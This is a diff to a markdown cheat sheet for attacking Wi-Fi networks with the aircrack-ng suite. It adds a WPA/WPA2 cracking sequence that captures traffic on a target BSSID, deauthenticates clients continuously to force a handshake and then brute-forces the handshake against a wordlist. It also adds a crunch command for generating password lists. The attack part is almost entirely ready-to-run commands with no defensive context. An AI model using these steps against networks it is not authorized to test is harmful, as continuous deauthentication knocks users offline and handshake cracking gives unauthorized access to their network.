@@ -4,6 +4,8 @@ In this example
 - `mon0` is the name of your interface in monitor mode
 - `XX:XX:XX:XX:XX:XX` is the bssid of target network
 - `-c X` is the channel of target network
+- `out` is the filename to capture the WPA handshake
+- `password.txt` is the filename to brute force
 
 ## Scan network around
 
@@ -29,9 +31,7 @@ Ctrl+C to stop deauth
 
 ```
 airodump-ng -c 6 --bssid 00:14:6C:7E:40:80 -w out mon0
-aireplay-ng --deauth 5 -a 00:14:6C:7E:40:80 mon0
-(wait for a few seconds)
-aircrack-ng -w /path/to/dictionary out.cap
+aireplay-ng --deauth 0 -a 00:14:6C:7E:40:80 mon0
 ```
 
 ## ARP request
@@ -42,6 +42,15 @@ aireplay-ng -0 10 -a 00:13:10:30:24:9C mon0
 aireplay-ng -3 -b 00:13:10:30:24:9C -h 00:09:5B:EB:C5:2B mon0
 ```
 
+## [Cracking WPA/WPA2](https://www.aircrack-ng.org/doku.php?id=cracking_wpa)
+
+```
+airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w out mon0
+aireplay-ng --deauth 0 -a 00:14:6C:7E:40:80 mon0
+(wait handshake)
+aircrack-ng -w password.txt -b 00:14:6C:7E:40:80 out*.cap 
+```
+
 ## Brute force tools
 
 Aircrack often uses brute force with some other tools as follows:
@@ -49,6 +58,10 @@ Aircrack often uses brute force with some other tools as follows:
 - [Cupp](https://github.com/lucthienphong1120/cupp)
 - /usr/share/wordlists/rockyou.txt.gz
 - [Crunch](https://www.kali.org/tools/crunch)
+
+```
+crunch [min] [max] [charset] -t [pattern] -o [path file]
+```
 
 
 
